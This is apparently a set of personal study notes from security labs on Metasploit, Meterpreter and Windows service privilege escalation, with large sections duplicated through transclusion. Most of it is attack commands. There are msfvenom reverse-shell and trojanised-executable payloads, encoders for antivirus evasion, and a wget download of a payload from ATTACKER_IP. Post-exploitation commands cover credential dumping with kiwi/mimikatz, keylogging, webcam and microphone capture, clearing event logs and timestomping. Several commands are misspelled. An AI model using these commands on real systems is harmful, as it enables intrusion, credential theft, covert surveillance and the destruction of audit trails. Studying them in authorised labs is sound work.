## Hashdump
- will **list** the content of the **[[SAM\|SAM]] database**
- These hashes can also be used in [[Pass-the-Hash\|Pass-the-Hash]] attacks
## Search
- useful to locate **files with** potentially **juicy information**
- In a CTF context, this can be used to quickly **find a flag or proof file,**
- In penetration testing engagements, may need to search for **user-generated files** or c**onfiguration files** that may contain **password or account information.**
```shell-session
search -f flag2.txt
```
## Shell
- Launch a regular command-line shell on the target system
- CTRL+Z will help you go back to the Meterpreter shell.
```sh
shell
```
## powershell
Get a powershell on meterpreter
```shell
load powershell
powershell_shell
```

## Persistence
Background
```shell
use exploit/windows/local/persistence_service
use exploit/windows/local/persistence
```
- Use 
`windows/x64/shell/reverse_https`

Forground
```shell
run exploit/windows/local/persistence args1[val1] args2[val2]
```
## Crack hash
```shell
use auxiliary/analize/jtr_crack_fast
```

## Enumerating gathering
### Windows
To run all below
```shell
run winenum
```

Aplications in the computer
```shell
use  post/windows/gather/enum_applications
set session 47
```
Devices, peripheral
```shell
use post/windows/gather/enum_devices
set session 47
```
Files
```shell
use post/windows/gather/enumfiles
```
Internet explorer
```shell
use post/windows/gather/enum_ie
```
Users
```shell
use post/windows/gather/enum_logged_on_users
```
Licenses
```shell
use post/windows/gather/enum_ms_product_keys
```
Browsers history (malicious pages xx)
```shell
use post/windows/gather/browser_history
```
Drivers (write permissions)
```shell
use post/windows/gather/forensics/enum_drivers
```
Environment variables
```shell
use post/multi/gather/env
```
Hashdump
```shell
use post/windows/gather/hashdump
```
Hashdump after trying  escalate
```shell
use post/windows/gather/smart_hashdump
```
### Linux
```shell
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_users_history
use post/linux/gather/enum_protections
use post/linux/busybox/enum_connections
use post/linux/gather/hashdump
```
# Extensions
To show list of extensions
```sh
use -l
```
## stdapi
- Default
## Single sign on credential collector
```shell
use post/windows/gather/credential/sso
```
### kiwi mimikatz
 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- To windows
- On recent versions are parched
- Password dumping tool

| Option                                            | Description                                                 |
| ------------------------------------------------- | ----------------------------------------------------------- |
| `load kiwi`                                       | Load                                                        |
| `creds_all`                                       | Retrieve all credentials (parsed)                           |
| `lsa_dump_secrets`                                | Dump LSA secrets (unparsed)                                 |
| `lsa_dump_sam`                                    | Dump LSA SAM (unparsed)                                     |
| `golden_ticket_create`                            | Create a golden kerberos ticket to [[Golden ticket attack\|Golden ticket attack]] |
| `password_change -u user -n hashNTLM -P password` | Change the password/hash of a user                          |
When use `creds_all` allows us to steal this password out of memory even without the user 'Dark' logged in **if a scheduled task** runs the Icecast as the user 'Dark'.

</div></div>

# Some modules
## To scan vuln on windows
```shell
run multi/recon/local_exploit_suggester
```
## Enable [[RDP\|RDP]]
```shell
run post/windows/manage/enable_rdp
```


</div></div>


# Encoders
- Encoders **do not aim to bypass antivirus** installed on the target system
- **Encode** the payload.
- Can be effective against **some antivirus** software
- Use with `-e`

| Option         | Description                                                 |
| -------------- | ----------------------------------------------------------- |
| `-f <format>`  | Specifies the output format.                                |
| `-o <file>`    | The output location and filename for the generated payload. |
| `LHOST=<IP>`   | Specifies the IP to connect back to.                        |
| `LPORT=<port>` | The port on the local machine to connect back to.           |
| `--platform`   | specificity paltorm                                         |
| `-a`           | specificity arch                                            |
| `-i 10`        | Interate, times to encode                                   |
| `-e`           | Especify the encoder method                                 |
The PHP version of Meterpreter was **encoded in Base64**, and the output format was `raw`.
Staged
``` shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
```

 To get access with [[Notes/Netcat\|Netcat]] 
``` shell
msfvenom -p php/shell/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
```
# FIle templates
- Set payload into a existent file
- Doesn't work on all programs

| Option   | Description                                |
| -------- | ------------------------------------------ |
| `-x`     | Set the original program                   |
| `--keep` | Try to keep the original app functionality |
Windows
```shell
msfvemon -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4747 -e x86/shikata_ga_nai -i 25 -x original_app.exe --keep -f exe -o new_app.exe
```

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Like socat and netcat
- used to **receive reverse shells.**
- fully-fledged way to obtain stable shells
- with a wide variety of further options to improve the caught shell.
- only way to interact with a _meterpreter_ shell
- the easiest way to handle _staged_ payloads
- Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.
``` shell
use exploit/multi/handler
```
set the payload value (`php/reverse_php` in this case), the LHOST, and LPORT values.
`php/meterpreter/reverse_tcp`
```bash
set payload php/reverse_php
setg LHOST 192.x.x.x
setg LPORT 47
```

Example to DVWA (Damn Vulnerable Web Application)
``` sh
set payload php/reverse_php
set lhost 10.0.2.19
set lport 7777
run
```

send seasson to background
```
background
```

Start a listener in the background
```sh
exploit -j
```
Then we needed to use `sessions 1` to foreground it again.


</div></div>


</div></div>

Move to the folder.
```powershell
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
```
Grant full permissions to the Everyone group as well:
```powershell
icacls Disk.exe /grant Everyone:F
```
Start a revershell listener on attacker machine.
And restart the service. (In a normal case you would likely have to wait for a service restart)
```powershell
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```
> [!note]
 PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.



</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Insecure Permissions on Service Executable

</div>


- If the **executable** associated with a service **has weak permissions** that allow an attacker to modify or replace it, the attacker can **gain** the **privileges** of the service's account trivially.

Example
```cmd
sc qc WindowsScheduler
```
```powershell
sc.exe qc WindowsScheduler
```
![Pasted image 20240821083409.png|600](/img/user/attachments/Pasted%20image%2020240821083409.png)
Check permissions with `icalcs`
```shell-session
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```
![Pasted image 20240821083627.png|600](/img/user/attachments/Pasted%20image%2020240821083627.png)
The everyone group has modify permissions `(M)` on the service's executable.
We can overwrite it with any payload.
Generate an exe-service payload using [[Msfvenom\|Msfvenom]]

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Generate payloads
- Access all payloads available in the Metasploit framework.
- Create payloads in many different formats (PHP, exe, dll, elf, , aspx, .war, .py, etc.)
- Different target systems (Apple, Windows, Android, Linux, etc.).
- Used extensively in **lower-level exploit** development to generate **hexadecimal shellcode** when developing something like a **Buffer Overflow exploit**

| Option                                               | Description                                         |
| ---------------------------------------------------- | --------------------------------------------------- |
| `msfvenom -l payloads`                               | Show payloads                                       |
| `msfvenom --list payloads`                           | list supported output formats                       |
| `msfvenom -p payload`                                | Select a payload                                    |
| `msfvenom -p cmd/unix/reverse_netcat --list-options` | List options                                        |
| `R`                                                  | Set `R` at final of code is to specify reverseshell |

```shell
payload options
```
```sh
msfvenom --list payloads
```
```sh
msfvenom -s linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=443
```
# Non staged - Single
- send payload in 1 file
- easier to use and catch
- easier for an antivirus or intrusion detection program to discover and remove.
- Stageless payloads are denoted with underscores (`_`)
# Stages
- send payload in some files or parts
- harder to use,
- **first part** is called the _stager_
- executed directly on the server itself.
- It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself.
- preventing it from touching the disk where it could be caught by traditional anti-virus solutions.
- connects to the listener and uses the connection **to load the real payload**
- Thus the payload is **split** into **two parts**
	- a small **initial stager**
	- then the bulkier **reverse shell code** which is downloaded when the stager is activated
- Staged payloads require a special listener, usually the Metasploit Multihandler
- Modern day antivirus solutions will also make use of the [[AMSI\|AMSI]] to detect the payload
- are denoted with another forward slash (`/`).
# **Output formats**
```
msfvenom --list formats
```

# Payloads
## Payload Naming Conventions
```sh
<OS>/<arch>/<payload>
```

Stageless reverse shell for an x86 Linux target
```sh
linux/x86/shell_reverse_tcp
```

Windows 32bit targets
- exception, the arch is not specified
```sh
windows/shell_reverse_tcp
```
## Reverse payloads
- you will need to **have the** exploit/multi/**handler module listening** on your attacking machine to work as a handler
- You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters.
- These values will be the same you have used when creating the msfvenom payload.

| Option                                                                                          | Description |
| ----------------------------------------------------------------------------------------------- | ----------- |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe` | Windows     |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp` | ASP         |
| `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`          | Python      |
| `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`     | PHP         |
| `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`                                | Unix        |
Linux - Executable and Linkable Format (elf)
- staged
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```
- The .elf format is comparable to the .exe format in Windows
```bash
chmod +x shell.elf
./shell.elf
```

### Windows
Exe-service
- Exe-service payload and serve it through a python webserver:
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4747 -f exe-service -o rev-svc.exe

python3 -m http.server
```
- Pull the payload from Powershell
```powershell
wget http://ATTACKER_IP:4848/rev-svc.exe -O rev-svc.exe
```

Windows reverse tcp (staged)
``` shell
mfsvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
```

Windows reverse tcp (non staged)
``` shell
mfsvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
```
Windows x64 reverse shell, exe format
```sh
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```
### PHP
- The output **PHP file** will miss the starting PHP tag commented and the end tag (`?>`), as seen below.
![Pasted image 20240606180600.png|600](/img/user/attachments/Pasted%20image%2020240606180600.png)
- The reverse_shell.php file should be edited to convert it into a working PHP file.
- Below: Comments removed from the beginning of the file.
- End tag added
![Pasted image 20240606180735.png|500](/img/user/attachments/Pasted%20image%2020240606180735.png)
![Pasted image 20240606180753.png|400](/img/user/attachments/Pasted%20image%2020240606180753.png)

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Metasploit attack payload
- Metasploit's own brand of fully-featured shell.
- completely stable, making them a **very good thing when working with Windows targets**
- Inbuilt functionality, such as file **uploads** and **downloads**.
- that provides an **interactive shell** from which an attacker can explore the target machine and **execute code.**
- runs on the target system but **is not installed** on it. It **runs in memory**
- It is typically deployed using in-memory DLL injection to reside entirely in **memory**.
- aims to **avoid** being **detected** during **antivirus** scans.
- aims to avoid being detected by network-based [[IPS\|IPS]] and [[IDS\|IDS]]
- The **downside** to meterpreter shells is that they _must_ be caught in Metasploit.
- using **encrypted** communication
- **If** the target organization **does not decrypt and inspect** encrypted **traffic** (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions **will not be able to detect** its activities.
- establish an encrypted ([[TLS\|TLS]]) communication channel
- most **antivirus** software **will** **detect it.**
- Run in windows under the `spoolsv.exe` process

| Option                                         | Description                                             |
| ---------------------------------------------- | ------------------------------------------------------- |
| `help`                                         | SHow help                                               |
| `getpid`                                       | Show the [[PID\|PID]]                                        |
| `ps`                                           | list processes running on the system                    |
| `tasklist /m /fi "pid eq 1304"`                | look at DLLs (Dynamic-Link Libraries) used by a process |
| `msfvenom --list payloads \| grep meterpreter` | List type of meterpreter payloads                       |
- some exploits will have a default Meterpreter payload

# Migrate shell to meterpreter
By default upgrade to x32 (x86)
```shell
post/multi/manage/shell_to_meterpreter
```
It possible to modify the ruby code to change to x64
![Pasted image 20241003114902.png](/img/user/attachments/Pasted%20image%2020241003114902.png)
```shell
reload_all
```
# How to decide which payload to use
- The target operating system (Is the target operating system Linux or Windows?
- Components available on the target system (Is Python installed? Is this a PHP website? etc.)
- Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)
# Commands
## Core commands

| Option       | Description                                            |
| ------------ | ------------------------------------------------------ |
| `background` | Backgrounds the current session                        |
| `exit`       | Terminate the Meterpreter session                      |
| `guid`       | Get the session GUID (Globally Unique Identifier)      |
| `help`       | Displays the help menu                                 |
| `info`       | Displays information about a Post module               |
| `irb`        | Opens an interactive Ruby shell on the current session |
| `load`       | Loads one or more Meterpreter extensions               |
| `migrate`    | Allows you to migrate Meterpreter to another process   |
| `run`        | Executes a Meterpreter script or Post module           |
| `sessions`   | Quickly switch to another session                      |
## File system commands

| Option                   | Description                                                   |
| ------------------------ | ------------------------------------------------------------- |
| `cd`                     | Will change directory                                         |
| `ls`                     | Will list files in the current directory (dir will also work) |
| `pwd`                    | Prints the current working directory                          |
| `edit`                   | will allow you to edit a file                                 |
| `cat`                    | Will show the contents of a file to the screen                |
| `rm`                     | Will delete the specified file                                |
| `rmdir`                  | Will delete a folder.                                         |
| `search`                 | Will search for files                                         |
| `upload local_path_file` | Will upload a file or directory                               |
| `download`               | Will download a file or directory                             |
## Networking commands

| Option                                     | Description                                                |
| ------------------------------------------ | ---------------------------------------------------------- |
| `arp`                                      | Displays the host ARP (Address Resolution Protocol) cache  |
| `ifconfig`                                 | Displays network interfaces available on the target system |
| `netstat`                                  | Displays the network connections                           |
| `route`                                    | Allows you to view and modify the routing table            |
| `portfwd`                                  | Forwards a local port to a remote service                  |
| `portfwd add -l 8080 -p 80 -r 10.0.2.3`    | lport 8080, rport 80, rhost 10.0.2.3                       |
| `portfwd delete -l 8080 -p 80 -r 10.0.2.3` | Delete                                                     |
| `portfwd list`                             | List porforwarding configs                                 |
## System commands

| Option       | Description                                          |
| ------------ | ---------------------------------------------------- |
| `sysinfo`    | Gets information about the remote system, such as OS |
| `getuid`     | Shows the user that Meterpreter is running as        |
| `clearev`    | Clears the event logs                                |
| `execute`    | Executes a command                                   |
| `getpid`     | Shows the current process identifier                 |
| `kill`       | Terminates a process                                 |
| `pkill`      | Terminates processes by name                         |
| `ps`         | Lists running processes                              |
| `reboot`     | Reboots the remote computer                          |
| `shell`      | Drops into a system command shell                    |
| `shutdown`   | Shuts down the remote computer                       |
| `show_mount` | Show mount drivers                                   |
## Keylogger
| Option          | Description                 |
| --------------- | --------------------------- |
| `keyscan_start` | Starts capturing keystrokes |
| `keyscan_stop`  | tops capturing keystrokes   |
| `keyscan_dump`  | Dumps the keystroke buffer  |
## Sniffer

| Option               | Description     |
| -------------------- | --------------- |
| `use sniffer`        | Use             |
| `sniffer_interfaces` | Show interfaces |
| `snifer_start`       |                 |
| `snifer_stats`       | Show stats      |
| `snifer_stop`        |                 |
| `snifer_dumps`       |                 |
## Webcam

| Option          | Description                                    |
| --------------- | ---------------------------------------------- |
| `webcam_chat`   | Starts a video chat                            |
| `webcam_list`   | Lists webcams                                  |
| `webcam_snap`   | Takes a snapshot from the specified webcam     |
| `webcam_stream` | Plays a video stream from the specified webcam |
## Activity
Get a kit of features, screenshots, webcam, keylogger.

| Option           | Description        |
| ---------------- | ------------------ |
| `load beholder`  | Load               |
| `beholder_start` | Start the beholder |
## Other commands
These will be listed under different menu categories in the help menu

| Option        | Description                                                 |
| ------------- | ----------------------------------------------------------- |
| `idletime`    | Returns the number of seconds the remote user has been idle |
| `screenshare` | Allows you to watch the remote user's desktop in real time  |
| `screenshot`  | Grabs a screenshot of the interactive desktop               |
| `record_mic`  | Records audio from the default microphone for X seconds     |
| `getsystem`   | Attempts to elevate your privilege to that of local system  |
| `hashdump`    | Dumps the contents of the SAM database                      |
| `getprivs`    | Show privileges                                             |
| `timestomp`   | Modify timestamps of files on the system.                   |
| `run vnc`     | Run an [[vnc\|vnc]] in a machine.                                |
# Versions available
- Android
- Apple iOS
- Java
- Linux

| Option                              | Description           |
| ----------------------------------- | --------------------- |
| `linux/x86/meterpreter_reverse_tcp` | Linux 32bit stageless |
- OSX
- PHP
- Python
- Windows

| Option                                | Description                              |
| ------------------------------------- | ---------------------------------------- |
| `windows/x64/meterpreter/reverse_tcp` | Windows 64bit staged Meterpreter payload |
# Post explotation
- `getuid` This will give you an idea of your possible privilege level on the target system - NT AUTHORITY\SYSTEM or a regular user?
- The `ps` command will list running processes. The PID column will also give you the PID information you will need to **migrate Meterpreter to another process.**

## Post explotation Phases
- Gathering further information about the target system.
- Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
- Privilege escalation.
- Lateral movement.

## Migrate
- if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.),
- you can migrate to it and start **capturing keystrokes** sent by the user to this process
- Some Meterpreter versions will offer the `keyscan_start`, or others commands options to make Meterpreter act like a **keylogger**.
- may also help you to have a **more stable** Meterpreter **session**.
- **Alert** you **may lose** your user **privileges** **if you migrate from a higher privileged** (e.g. SYSTEM) user to a process started by a lower privileged user (e.g. webserver). You **may not be able to gain them back.**
- By default meterpreter 
  `powershell.exe x86 User-PC\User C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe`
- look for a process
  ` 2244  488   taskeng.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe`

| Option                    | Description          |
| ------------------------- | -------------------- |
| `migrate -N PROCESS_NAME` | Using the name       |
| `migrate PID_NUMBER`      | Using the PID number |
## Hashdump
- will **list** the content of the **[[SAM\|SAM]] database**
- These hashes can also be used in [[Pass-the-Hash\|Pass-the-Hash]] attacks
## Search
- useful to locate **files with** potentially **juicy information**
- In a CTF context, this can be used to quickly **find a flag or proof file,**
- In penetration testing engagements, may need to search for **user-generated files** or c**onfiguration files** that may contain **password or account information.**
```shell-session
search -f flag2.txt
```
## Shell
- Launch a regular command-line shell on the target system
- CTRL+Z will help you go back to the Meterpreter shell.
```sh
shell
```
## powershell
Get a powershell on meterpreter
```shell
load powershell
powershell_shell
```

## Persistence
Background
```shell
use exploit/windows/local/persistence_service
use exploit/windows/local/persistence
```
- Use 
`windows/x64/shell/reverse_https`

Forground
```shell
run exploit/windows/local/persistence args1[val1] args2[val2]
```
## Crack hash
```shell
use auxiliary/analize/jtr_crack_fast
```

## Enumerating gathering
### Windows
To run all below
```shell
run winenum
```

Aplications in the computer
```shell
use  post/windows/gather/enum_applications
set session 47
```
Devices, peripheral
```shell
use post/windows/gather/enum_devices
set session 47
```
Files
```shell
use post/windows/gather/enumfiles
```
Internet explorer
```shell
use post/windows/gather/enum_ie
```
Users
```shell
use post/windows/gather/enum_logged_on_users
```
Licenses
```shell
use post/windows/gather/enum_ms_product_keys
```
Browsers history (malicious pages xx)
```shell
use post/windows/gather/browser_history
```
Drivers (write permissions)
```shell
use post/windows/gather/forensics/enum_drivers
```
Environment variables
```shell
use post/multi/gather/env
```
Hashdump
```shell
use post/windows/gather/hashdump
```
Hashdump after trying  escalate
```shell
use post/windows/gather/smart_hashdump
```
### Linux
```shell
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_users_history
use post/linux/gather/enum_protections
use post/linux/busybox/enum_connections
use post/linux/gather/hashdump
```
# Extensions
To show list of extensions
```sh
use -l
```
## stdapi
- Default
## Single sign on credential collector
```shell
use post/windows/gather/credential/sso
```
### kiwi mimikatz
 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- To windows
- On recent versions are parched
- Password dumping tool

| Option                                            | Description                                                 |
| ------------------------------------------------- | ----------------------------------------------------------- |
| `load kiwi`                                       | Load                                                        |
| `creds_all`                                       | Retrieve all credentials (parsed)                           |
| `lsa_dump_secrets`                                | Dump LSA secrets (unparsed)                                 |
| `lsa_dump_sam`                                    | Dump LSA SAM (unparsed)                                     |
| `golden_ticket_create`                            | Create a golden kerberos ticket to [[Golden ticket attack\|Golden ticket attack]] |
| `password_change -u user -n hashNTLM -P password` | Change the password/hash of a user                          |
When use `creds_all` allows us to steal this password out of memory even without the user 'Dark' logged in **if a scheduled task** runs the Icecast as the user 'Dark'.

</div></div>

# Some modules
## To scan vuln on windows
```shell
run multi/recon/local_exploit_suggester
```
## Enable [[RDP\|RDP]]
```shell
run post/windows/manage/enable_rdp
```


</div></div>


# Encoders
- Encoders **do not aim to bypass antivirus** installed on the target system
- **Encode** the payload.
- Can be effective against **some antivirus** software
- Use with `-e`

| Option         | Description                                                 |
| -------------- | ----------------------------------------------------------- |
| `-f <format>`  | Specifies the output format.                                |
| `-o <file>`    | The output location and filename for the generated payload. |
| `LHOST=<IP>`   | Specifies the IP to connect back to.                        |
| `LPORT=<port>` | The port on the local machine to connect back to.           |
| `--platform`   | specificity paltorm                                         |
| `-a`           | specificity arch                                            |
| `-i 10`        | Interate, times to encode                                   |
| `-e`           | Especify the encoder method                                 |
The PHP version of Meterpreter was **encoded in Base64**, and the output format was `raw`.
Staged
``` shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
```

 To get access with [[Notes/Netcat\|Netcat]] 
``` shell
msfvenom -p php/shell/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
```
# FIle templates
- Set payload into a existent file
- Doesn't work on all programs

| Option   | Description                                |
| -------- | ------------------------------------------ |
| `-x`     | Set the original program                   |
| `--keep` | Try to keep the original app functionality |
Windows
```shell
msfvemon -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4747 -e x86/shikata_ga_nai -i 25 -x original_app.exe --keep -f exe -o new_app.exe
```

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Like socat and netcat
- used to **receive reverse shells.**
- fully-fledged way to obtain stable shells
- with a wide variety of further options to improve the caught shell.
- only way to interact with a _meterpreter_ shell
- the easiest way to handle _staged_ payloads
- Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.
``` shell
use exploit/multi/handler
```
set the payload value (`php/reverse_php` in this case), the LHOST, and LPORT values.
`php/meterpreter/reverse_tcp`
```bash
set payload php/reverse_php
setg LHOST 192.x.x.x
setg LPORT 47
```

Example to DVWA (Damn Vulnerable Web Application)
``` sh
set payload php/reverse_php
set lhost 10.0.2.19
set lport 7777
run
```

send seasson to background
```
background
```

Start a listener in the background
```sh
exploit -j
```
Then we needed to use `sessions 1` to foreground it again.


</div></div>


</div></div>

Replace the service executable with our payload
```powershell
cd C:\PROGRA~2\SYSTEM~1\

move WService.exe WService.exe.bkp

move C:\Users\thm-unpriv\rev-svc.exe WService.exe
```
Grant full permissions to the Everyone group as well:
```powershell
icacls WService.exe /grant Everyone:F
```
Start a revershell listener on attacker machine.
And restart the service. (In a normal case you would likely have to wait for a service restart)
```powershell
sc stop windowsscheduler
sc start windowsscheduler
```
> [!note]
 PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.



</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Insecure Service Permissions

</div>


- If the **service** [[DACL\|DACL]] **allow** you ti **modify** the **configuration** of a service, we will be able to **reconfigure** the service.
- Pointing to any **executable** to **run** it using any account, including `SYSTEM` itself.

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Check for a **service** [[DACL\|DACL]]
- https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
Run it on `cmd`
```cmd
accesschk64.exe -qlc thmservice
```

Example:
![Pasted image 20240822181926.png|400](/img/user/attachments/Pasted%20image%2020240822181926.png)
- The `BUILTIN\\Users` group has the SERVICE_ALL_ACCESS permission
- Means **any user** can reconfigure the service.

</div></div>

Create the payload

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Generate payloads
- Access all payloads available in the Metasploit framework.
- Create payloads in many different formats (PHP, exe, dll, elf, , aspx, .war, .py, etc.)
- Different target systems (Apple, Windows, Android, Linux, etc.).
- Used extensively in **lower-level exploit** development to generate **hexadecimal shellcode** when developing something like a **Buffer Overflow exploit**

| Option                                               | Description                                         |
| ---------------------------------------------------- | --------------------------------------------------- |
| `msfvenom -l payloads`                               | Show payloads                                       |
| `msfvenom --list payloads`                           | list supported output formats                       |
| `msfvenom -p payload`                                | Select a payload                                    |
| `msfvenom -p cmd/unix/reverse_netcat --list-options` | List options                                        |
| `R`                                                  | Set `R` at final of code is to specify reverseshell |

```shell
payload options
```
```sh
msfvenom --list payloads
```
```sh
msfvenom -s linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=443
```
# Non staged - Single
- send payload in 1 file
- easier to use and catch
- easier for an antivirus or intrusion detection program to discover and remove.
- Stageless payloads are denoted with underscores (`_`)
# Stages
- send payload in some files or parts
- harder to use,
- **first part** is called the _stager_
- executed directly on the server itself.
- It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself.
- preventing it from touching the disk where it could be caught by traditional anti-virus solutions.
- connects to the listener and uses the connection **to load the real payload**
- Thus the payload is **split** into **two parts**
	- a small **initial stager**
	- then the bulkier **reverse shell code** which is downloaded when the stager is activated
- Staged payloads require a special listener, usually the Metasploit Multihandler
- Modern day antivirus solutions will also make use of the [[AMSI\|AMSI]] to detect the payload
- are denoted with another forward slash (`/`).
# **Output formats**
```
msfvenom --list formats
```

# Payloads
## Payload Naming Conventions
```sh
<OS>/<arch>/<payload>
```

Stageless reverse shell for an x86 Linux target
```sh
linux/x86/shell_reverse_tcp
```

Windows 32bit targets
- exception, the arch is not specified
```sh
windows/shell_reverse_tcp
```
## Reverse payloads
- you will need to **have the** exploit/multi/**handler module listening** on your attacking machine to work as a handler
- You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters.
- These values will be the same you have used when creating the msfvenom payload.

| Option                                                                                          | Description |
| ----------------------------------------------------------------------------------------------- | ----------- |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe` | Windows     |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp` | ASP         |
| `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`          | Python      |
| `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`     | PHP         |
| `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`                                | Unix        |
Linux - Executable and Linkable Format (elf)
- staged
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```
- The .elf format is comparable to the .exe format in Windows
```bash
chmod +x shell.elf
./shell.elf
```

### Windows
Exe-service
- Exe-service payload and serve it through a python webserver:
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4747 -f exe-service -o rev-svc.exe

python3 -m http.server
```
- Pull the payload from Powershell
```powershell
wget http://ATTACKER_IP:4848/rev-svc.exe -O rev-svc.exe
```

Windows reverse tcp (staged)
``` shell
mfsvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
```

Windows reverse tcp (non staged)
``` shell
mfsvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
```
Windows x64 reverse shell, exe format
```sh
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```
### PHP
- The output **PHP file** will miss the starting PHP tag commented and the end tag (`?>`), as seen below.
![Pasted image 20240606180600.png|600](/img/user/attachments/Pasted%20image%2020240606180600.png)
- The reverse_shell.php file should be edited to convert it into a working PHP file.
- Below: Comments removed from the beginning of the file.
- End tag added
![Pasted image 20240606180735.png|500](/img/user/attachments/Pasted%20image%2020240606180735.png)
![Pasted image 20240606180753.png|400](/img/user/attachments/Pasted%20image%2020240606180753.png)

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Metasploit attack payload
- Metasploit's own brand of fully-featured shell.
- completely stable, making them a **very good thing when working with Windows targets**
- Inbuilt functionality, such as file **uploads** and **downloads**.
- that provides an **interactive shell** from which an attacker can explore the target machine and **execute code.**
- runs on the target system but **is not installed** on it. It **runs in memory**
- It is typically deployed using in-memory DLL injection to reside entirely in **memory**.
- aims to **avoid** being **detected** during **antivirus** scans.
- aims to avoid being detected by network-based [[IPS\|IPS]] and [[IDS\|IDS]]
- The **downside** to meterpreter shells is that they _must_ be caught in Metasploit.
- using **encrypted** communication
- **If** the target organization **does not decrypt and inspect** encrypted **traffic** (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions **will not be able to detect** its activities.
- establish an encrypted ([[TLS\|TLS]]) communication channel
- most **antivirus** software **will** **detect it.**
- Run in windows under the `spoolsv.exe` process

| Option                                         | Description                                             |
| ---------------------------------------------- | ------------------------------------------------------- |
| `help`                                         | SHow help                                               |
| `getpid`                                       | Show the [[PID\|PID]]                                        |
| `ps`                                           | list processes running on the system                    |
| `tasklist /m /fi "pid eq 1304"`                | look at DLLs (Dynamic-Link Libraries) used by a process |
| `msfvenom --list payloads \| grep meterpreter` | List type of meterpreter payloads                       |
- some exploits will have a default Meterpreter payload

# Migrate shell to meterpreter
By default upgrade to x32 (x86)
```shell
post/multi/manage/shell_to_meterpreter
```
It possible to modify the ruby code to change to x64
![Pasted image 20241003114902.png](/img/user/attachments/Pasted%20image%2020241003114902.png)
```shell
reload_all
```
# How to decide which payload to use
- The target operating system (Is the target operating system Linux or Windows?
